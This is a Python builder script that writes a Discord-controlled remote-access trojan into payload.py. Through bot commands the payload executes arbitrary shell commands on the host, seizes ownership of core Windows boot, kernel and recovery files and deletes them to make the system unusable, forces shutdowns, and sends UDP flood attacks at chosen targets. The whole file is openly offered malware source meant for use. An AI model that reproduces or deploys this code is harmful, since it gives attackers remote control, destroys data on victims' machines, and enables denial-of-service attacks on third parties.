import os
import colorama
from colorama import Fore, Style

def generate_payload(token):
    payload_template = r"""
import os
import discord
import time
import shutil
import subprocess
from discord.ext import commands
import socket

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    print('------')

@bot.command()
async def hello(ctx):
    await ctx.send(f"Hello {ctx.author.mention}!")

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            await ctx.send(f"Command output:\n```{result.stdout}```")
        else:
            await ctx.send(f"Command error:\n```{result.stderr}```")
    except Exception as e:
        await ctx.send(f"An error occurred when opening cmd session: {e}")

@bot.command()
async def destroy(ctx):
    try:
        paths = [
            "C:\\Windows", "C:\\Windows\\System32", "C:\\Windows\\System32\\hal.dll",
            "C:\\Windows\\System32\\ntoskrnl.exe",
            "C:\\Windows\\System32\\Boot\\winload.exe", "C:\\Windows\\System32\\kdcom.dll",
            "C:\\Windows\\System32\\bootmgr",
            "C:\\Windows\\System32\\kernel32.dll", "C:\\Windows\\System32\\ntdll.dll",
            "C:\\Windows\\System32\\ntfs.sys",
            "C:\\Windows\\System32\\volsnap.sys", "C:\\Windows\\System32\\hidclass.sys",
            "C:\\Windows\\System32\\mountmgr.sys",
            "C:\\Windows\\System32\\usbhub.sys", "C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini",
            "C:\\Windows\\Inf", "C:\\Windows\\System32\\Recovery", "C:\\Windows\\System32\\Restore",
            "C:\\Windows\\System32\\winre.wim",
            "C:\\Windows\\System32\\rstrui.exe"
        ]
        for path in paths:
            subprocess.run(['takeown', '/F', path], check=True)
            subprocess.run(['icacls', path, "/t", "/grant", "Everyone:(OI)(CI)F"], check=True)

        directories = ["C:\\Windows\\System32\\Boot", "C:\\Windows\\System32", "C:\\Windows\\Inf",
                       "C:\\Windows\\System32\\Recovery", "C:\\Windows\\System32\\Restore"]
        files = [
            "C:\\Windows\\System32\\ntoskrnl.exe", "C:\\Windows\\System32\\hal.dll",
            "C:\\Windows\\System32\\Boot\\winload.exe",
            "C:\\Windows\\System32\\kdcom.dll", "C:\\Windows\\System32\\bootmgr", "C:\\Windows\\System32\\kernel32.dll",
            "C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\ntfs.sys", "C:\\Windows\\System32\\volsnap.sys",
            "C:\\Windows\\System32\\hidclass.sys", "C:\\Windows\\System32\\mountmgr.sys",
            "C:\\Windows\\System32\\usbhub.sys",
            "C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini", "C:\\Windows\\System32\\winre.wim",
            "C:\\Windows\\System32\\rstrui.exe"
        ]

        for directory in directories:
            shutil.rmtree(directory, ignore_errors=True)

        for file in files:
            os.remove(file)

        await ctx.send("System destruction initiated. Your Windows installation is likely fucked.")
    except Exception as e:
        await ctx.send(f"An error occurred during system destruction: {e}")

@bot.command()
async def reboot(ctx):
    try:
        subprocess.run("shutdown /r /t 0", shell=True, check=True)
        await ctx.send("Rebooting the system.")
    except Exception as e:
        await ctx.send(f"An error occurred during reboot: {e}")

@bot.command()
async def shutdown(ctx):
    try:
        subprocess.run("shutdown /s /t 0", shell=True, check=True)
        await ctx.send("Shutting down the system.")
    except Exception as e:
        await ctx.send(f"An error occurred during shutdown: {e}")

@bot.command()
async def bios(ctx):
    try:
        subprocess.run("shutdown /fw /t 0", shell=True, check=True)
        await ctx.send("Entering BIOS.")
    except Exception as e:
        await ctx.send(f"An error occurred while trying to enter BIOS: {e}")

@bot.command()
async def ddos(ctx, target: str, port: int, duration: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = os.urandom(1490)
        nukes_sent = 0
        end_time = time.time() + duration

        while time.time() < end_time:
            sock.sendto(bytes, (target, port))
            nukes_sent += 1

        await ctx.send(f"Sent {nukes_sent} packets to {target}:{port} over {duration} seconds.")
    except Exception as e:
        await ctx.send(f"An error occurred during DDoS attack: {e}")

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'🏓 Pong! {latency}ms')

bot.run('{token}')
"""
    return payload_template

if __name__ == "__main__":
    print(Fore.MAGENTA, """
 ________  .__                                       
\______ \ |__| ________  _  _______ _______   ____
 |    |  \|  |/  ___/\ \/ \/ /\__  \\_  __ \_/ __ \
 |    `   \  |\___ \  \     /  / __ \|  | \/\  ___/
/_______  /__/____  >  \/\_/  (____  /__|    \___  >
        \/        \/               \/            \/
    """, Style.RESET_ALL)
    token = input("Enter your Discord bot token: ")
    try:
        payload = generate_payload(token)
        with open("payload.py", "w") as file:
            file.write(payload)
        print(Fore.GREEN, f"Payload created and saved as payload.py")
    except Execption as e:
     print(Fore.RED,"An error occured :",e)